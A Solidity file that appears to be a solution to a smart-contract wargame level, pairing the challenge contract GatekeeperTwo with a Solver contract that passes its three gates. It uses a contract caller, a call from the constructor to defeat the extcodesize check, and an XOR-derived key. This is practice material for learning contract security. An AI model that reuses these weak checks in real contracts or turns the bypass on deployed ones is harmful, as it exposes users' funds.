// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Again we have a Gatekeeper contract with 3 modifiers
// We need to call the enter function but need to pass those 3 modifiers for it



contract GatekeeperTwo {
    address public entrant;

    // 1st modifier: msg.sender unequal to tx.origin
    // 2 potential solutions: (1) use contract or (2) use other EOA? 
    // Solution: use contract (see below)
    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    // Codesize needs to be 0 to pass this modifier
    // 2 potential solutions: (1) caller is EAO, (2) caller is contract who passed this (for instance with constructor)
    // Solution: deploy code within constructor
    // During a contract's constructor execution, its code has not yet been deployed (extcodesize is still 0)
    // So we call the enter function already within the deployer!
    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0); // So caller must have no code!
        _;
    }

    // msg.sender: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4
    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    //bytes32 public testPart1 = abi.encodePacked(msg.sender);
    bytes8 public testPart2 = bytes8(keccak256(abi.encodePacked(msg.sender)));
    uint64 public testPart3 = uint64(bytes8(keccak256(abi.encodePacked(msg.sender))));
    
    // type(uint64).max is max number of 2**64 - 1 = 
    // Decimal: 18,446,744,073,709,551,615
    // Hexadecimal: 0xFFFFFFFFFFFFFFFF
    // Binary: 1111111111111111111111111111111111111111111111111111111111111111
    uint64 public testPart4 = type(uint64).max;

    // EASIER FIX:  A ^ B = C, THEN A ^ C = B and B ^ C = A
    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}


contract Solver {
    GatekeeperTwo public gatekeeper;

    constructor(address _gatekeeperAddress) {
        gatekeeper = GatekeeperTwo(_gatekeeperAddress);


        // Compute _gateKey for gateThree      
        // EASIER FIX:  A ^ B = C, THEN A ^ C = B and B ^ C = A
        bytes8 gateKey = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max
        );

        // Call `enter` from constructor to pass gateTwo
        gatekeeper.enter(gateKey);
    }
}